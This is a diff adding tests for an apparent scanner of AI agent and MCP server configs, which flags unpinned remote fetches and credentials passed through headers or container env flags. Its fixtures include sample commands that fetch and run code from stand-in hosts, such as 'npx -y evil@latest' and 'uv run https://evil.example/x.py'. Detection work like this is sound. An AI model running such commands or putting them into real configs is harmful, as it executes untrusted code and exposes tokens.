@@ -1727,6 +1727,172 @@ describe("scanAgentConfigs (#886)", () => {
       "fetches @latest: tool@latest",
     ]);
   });
+
+  // Shapes copied from Anthropic's official plugin marketplace, whose
+  // `.mcp.json` files list servers with no `mcpServers` wrapper (review B1).
+  test("a .mcp.json with servers at its top level lists each server (B1)", () => {
+    const playwright = scanOne(".mcp.json", {
+      playwright: { command: "npx", args: ["@playwright/mcp@latest"] },
+    });
+    expect(playwright).toEqual([
+      {
+        file: ".mcp.json",
+        line: 1,
+        kind: "mcp-server",
+        name: "playwright",
+        command: "npx @playwright/mcp@latest",
+        risks: ["unpinned remote fetch: npx @playwright/mcp@latest"],
+      },
+    ]);
+    const github = scanOne(".mcp.json", {
+      github: {
+        type: "http",
+        url: "https://api.githubcopilot.com/mcp/",
+        headers: { Authorization: "Bearer ${GITHUB_PERSONAL_ACCESS_TOKEN}" },
+      },
+    });
+    expect(github.map((f) => [f.name, f.command, f.risks])).toEqual([
+      [
+        "github",
+        "https://api.githubcopilot.com/mcp/",
+        [
+          "credential header: Authorization",
+          "credential reference: $GITHUB_PERSONAL_ACCESS_TOKEN",
+        ],
+      ],
+    ]);
+    // Non-object entries are not servers; with no object entry, a note.
+    expect(
+      scanOne("mcp.json", { $schema: "x", a: { command: "node" } }).map(
+        (f) => f.name,
+      ),
+    ).toEqual(["a"]);
+    expect(scanOne(".mcp.json", {})[0]).toMatchObject({
+      kind: "config",
+      name: "no mcpServers listed",
+      risks: [],
+    });
+    expect(scanOne(".mcp.json", { version: 1 })[0].name).toBe(
+      "no mcpServers listed",
+    );
+    // Not an MCP config by name: a bare object there is not servers.
+    expect(
+      scanOne(".claude/settings.json", { editor: { command: "npx x" } }),
+    ).toEqual([]);
+  });
+
+  test("a bare server map a plugin manifest names is scanned (B1)", () => {
+    const found = scanAgentConfigs({
+      files: [
+        file(".claude-plugin/plugin.json", {
+          name: "p",
+          mcpServers: "./mcp/servers.json",
+        }),
+        file("mcp/servers.json", {
+          h: {
+            command: "npx",
+            args: ["-y", "evil@latest"],
+            env: { TOKEN: "x" },
+          },
+        }),
+      ],
+    });
+    expect(found.map((f) => [f.file, f.name, f.risks])).toEqual([
+      [
+        "mcp/servers.json",
+        "h",
+        ["unpinned remote fetch: npx evil@latest", "credential env: TOKEN"],
+      ],
+    ]);
+  });
+
+  test("uv run: -w, --with after option values, and a script URL (B2)", () => {
+    const uv = (...args: string[]) =>
+      unpinnedFetchRisks(["uv", "run", ...args]);
+    expect(uv("-w", "evil", "server.py")).toEqual([
+      "unpinned remote fetch: uv run evil",
+    ]);
+    expect(uv("-wevil", "server.py")).toEqual([
+      "unpinned remote fetch: uv run evil",
+    ]);
+    expect(uv("--extra", "cli", "--with", "evil", "server.py")).toEqual([
+      "unpinned remote fetch: uv run evil",
+    ]);
+    expect(uv("--env-file", ".env", "--with", "evil", "server.py")).toEqual([
+      "unpinned remote fetch: uv run evil",
+    ]);
+    // An option this scan does not know, with a value: the scan goes on.
+    expect(uv("--not-known", "v", "--with=evil", "server.py")).toEqual([
+      "unpinned remote fetch: uv run evil",
+    ]);
+    expect(uv("https://evil.example/x.py")).toEqual([
+      "unpinned remote fetch: uv run https://evil.example/x.py",
+    ]);
+    expect(uv("--frozen", "HTTP://evil.example/x.py")).toEqual([
+      "unpinned remote fetch: uv run HTTP://evil.example/x.py",
+    ]);
+    expect(unpinnedFetchRisks(["uvx", "-w", "evil", "pkg==1.2.3"])).toEqual([
+      "unpinned remote fetch: uvx evil",
+    ]);
+    // Pinned or local stays clean; words after the command are its own.
+    expect(uv("-w", "dep==1.2.3", "server.py")).toEqual([]);
+    expect(uv("--extra", "cli", "server.py")).toEqual([]);
+    expect(uv("server.py", "--with", "x")).toEqual([]);
+    expect(uv("server.py", "--url", "https://api.example.com")).toEqual([]);
+  });
+
+  test("credentials passed to a container with -e / --env are a risk (B3)", () => {
+    const docker = (...args: string[]) =>
+      risksOf({ command: "docker", args: ["run", "-i", "--rm", ...args] });
+    const image = "ghcr.io/github/github-mcp-server:v0.5.0";
+    expect(docker("-e", "GITHUB_PERSONAL_ACCESS_TOKEN", image)).toEqual([
+      "credential env: GITHUB_PERSONAL_ACCESS_TOKEN",
+    ]);
+    expect(docker("-e", "TFE_TOKEN=${TFE_TOKEN}", image)).toEqual([
+      "credential env: TFE_TOKEN",
+      "credential reference: $TFE_TOKEN",
+    ]);
+    expect(docker("--env", "API_KEY", image)).toEqual([
+      "credential env: API_KEY",
+    ]);
+    expect(docker("--env=API_TOKEN", image)).toEqual([
+      "credential env: API_TOKEN",
+    ]);
+    expect(docker("--env=DB_PASSWORD=x", image)).toEqual([
+      "credential env: DB_PASSWORD",
+    ]);
+    expect(docker("-eCLIENT_SECRET", image)).toEqual([
+      "credential env: CLIENT_SECRET",
+    ]);
+    expect(
+      risksOf({
+        command: "podman",
+        args: ["container", "run", "-e", "GH_TOKEN", "img:1.0"],
+      }),
+    ).toEqual(["credential env: GH_TOKEN"]);
+    // Benign names, and `-e` outside a container command, are no risk.
+    expect(docker("-e", "DEBUG=1", "--env", "LOG_LEVEL", image)).toEqual([]);
+    expect(docker("--env-file", "TOKEN.env", image)).toEqual([]);
+    expect(
+      risksOf({ command: "node", args: ["-e", "process.env.API_TOKEN"] }),
+    ).toEqual([]);
+  });
+
+  test("== with a version and no * is an exact pin; @ stays strict (nit 1)", () => {
+    for (const spec of ["pkg==1.0", "mcp-server-time==2025.1", "p[x]==2"])
+      expect(unpinnedFetchRisks(["uvx", spec]), spec).toEqual([]);
+    expect(
+      unpinnedFetchRisks(["uv", "run", "--with", "pkg==1.0", "s.py"]),
+    ).toEqual([]);
+    for (const spec of ["pkg==1.*", "pkg@1.0", "pkg==1.0,evil"])
+      expect(unpinnedFetchRisks(["uvx", spec]), spec).toEqual([
+        `unpinned remote fetch: uvx ${spec}`,
+      ]);
+    // `>` splits the word as a shell redirect would; still a risk.
+    expect(unpinnedFetchRisks(["uvx", "pkg>=1.0"])).toEqual([
+      "unpinned remote fetch: uvx pkg",
+    ]);
+  });
 });
 
 describe("install preview: MCP servers and hooks (#886)", () => {
